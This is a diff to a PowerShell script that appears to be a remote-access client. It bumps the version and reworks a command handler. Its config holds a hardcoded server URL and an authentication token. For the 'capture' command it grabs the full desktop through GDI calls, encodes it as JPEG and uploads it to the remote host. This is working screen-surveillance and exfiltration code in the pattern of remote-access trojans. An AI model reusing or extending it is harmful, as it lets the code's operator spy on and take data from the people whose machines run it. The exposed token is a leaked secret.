@@ -2,7 +2,7 @@
 # ║  CONFIGURATION                                                             ║
 # ║  Edit these values to match your setup. All features reference these vars. ║
 # ╚══════════════════════════════════════════════════════════════════════════════╝
-$Version = "3.2.2"
+$Version = "3.2.3"
 $cfHost = "https://connect.aniketpandey.website"
 $cfToken = "81f7cc9dca3ded71456c89a83b8a5325fc7d9a345b76c7ac6eba8aa96fdd3782"  # must match server.py TOKEN
 $maxRetries = 10
@@ -1252,7 +1252,9 @@ function Connect-Cloudflare {
                 if ($command -eq "capture") {
                     try {
                         Add-Type -AssemblyName System.Drawing
-                        Add-Type -TypeDefinition @'
+                        if (-not ([System.Management.Automation.PSTypeName]'ScreenCapGdi').Type) {
+                            $drawingAsm = [System.Reflection.Assembly]::LoadWithPartialName('System.Drawing').Location
+                            Add-Type -ReferencedAssemblies $drawingAsm -TypeDefinition @'
 using System;
 using System.Runtime.InteropServices;
 using System.Drawing;
@@ -1260,7 +1262,7 @@ using System.Drawing.Imaging;
 public class ScreenCapGdi {
     [DllImport("user32.dll")] public static extern IntPtr GetDesktopWindow();
     [DllImport("user32.dll")] public static extern IntPtr GetWindowDC(IntPtr hWnd);
-    [DllImport("user32.dll")] public static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);
+    [DllImport("user32.dll")] public static extern int    ReleaseDC(IntPtr hWnd, IntPtr hDC);
     [DllImport("gdi32.dll")]  public static extern IntPtr CreateCompatibleDC(IntPtr hDC);
     [DllImport("gdi32.dll")]  public static extern IntPtr CreateCompatibleBitmap(IntPtr hDC, int w, int h);
     [DllImport("gdi32.dll")]  public static extern IntPtr SelectObject(IntPtr hDC, IntPtr hObj);
@@ -1271,21 +1273,21 @@ public class ScreenCapGdi {
     public static byte[] Capture() {
         IntPtr desktop = GetDesktopWindow();
         IntPtr dcSrc   = GetWindowDC(desktop);
-        int w = GetDeviceCaps(dcSrc, 8);   // HORZRES
-        int h = GetDeviceCaps(dcSrc, 10);  // VERTRES
-        IntPtr dcDst   = CreateCompatibleDC(dcSrc);
-        IntPtr hBmp    = CreateCompatibleBitmap(dcSrc, w, h);
-        IntPtr hOld    = SelectObject(dcDst, hBmp);
-        BitBlt(dcDst, 0, 0, w, h, dcSrc, 0, 0, 0x00CC0020); // SRCCOPY
+        int w = GetDeviceCaps(dcSrc, 8);
+        int h = GetDeviceCaps(dcSrc, 10);
+        IntPtr dcDst = CreateCompatibleDC(dcSrc);
+        IntPtr hBmp  = CreateCompatibleBitmap(dcSrc, w, h);
+        IntPtr hOld  = SelectObject(dcDst, hBmp);
+        BitBlt(dcDst, 0, 0, w, h, dcSrc, 0, 0, 0x00CC0020);
         SelectObject(dcDst, hOld);
         Bitmap bmp = Bitmap.FromHbitmap(hBmp);
         DeleteDC(dcDst);
         ReleaseDC(desktop, dcSrc);
         DeleteObject(hBmp);
-        var ms = new System.IO.MemoryStream();
+        var ms    = new System.IO.MemoryStream();
         var codec = GetJpegCodec();
-        var ep = new EncoderParameters(1);
-        ep.Param[0] = new EncoderParameter(Encoder.Quality, 85L);
+        var ep    = new EncoderParameters(1);
+        ep.Param[0] = new EncoderParameter(Encoder.Quality, (long)85);
         bmp.Save(ms, codec, ep);
         bmp.Dispose();
         return ms.ToArray();
@@ -1296,7 +1298,8 @@ public class ScreenCapGdi {
         return null;
     }
 }
-'@ -ErrorAction SilentlyContinue
+'@
+                        }
                         $jpegBytes  = [ScreenCapGdi]::Capture()
                         $captureUrl = "$cfHost/capture_frame?id=$clientId"
                         $req = [System.Net.HttpWebRequest]::Create($captureUrl)
